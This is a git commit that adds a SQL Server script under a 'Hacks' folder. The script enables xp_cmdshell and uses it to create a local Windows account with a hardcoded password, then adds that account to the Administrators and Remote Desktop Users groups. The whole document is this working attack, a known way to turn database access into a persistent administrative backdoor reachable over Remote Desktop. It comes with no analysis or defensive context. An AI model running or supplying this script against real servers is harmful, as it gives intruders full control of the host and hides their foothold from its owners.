c2dd233cc54f3558d63a9b20bee9f19f3b750142
Senen Fernandez <senen@senenfernandez.com>
2016-07-11 23:13:57 -0500

    Set Remote Desktop User

---
+++ SQLServer/Hacks/SetRemoteDesktopUser.sql
@@ -0,0 +1,14 @@
+﻿EXEC sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+EXEC sp_configure 'xp_cmdshell', 1
+GO
+RECONFIGURE
+GO
+xp_cmdshell 'net user /add Senen SuperSecurePassword'
+GO
+xp_cmdshell 'net localgroup "Administrators" Senen /add'
+GO
+xp_cmdshell 'net localgroup "Remote Desktop Users" Senen /add'
+GO
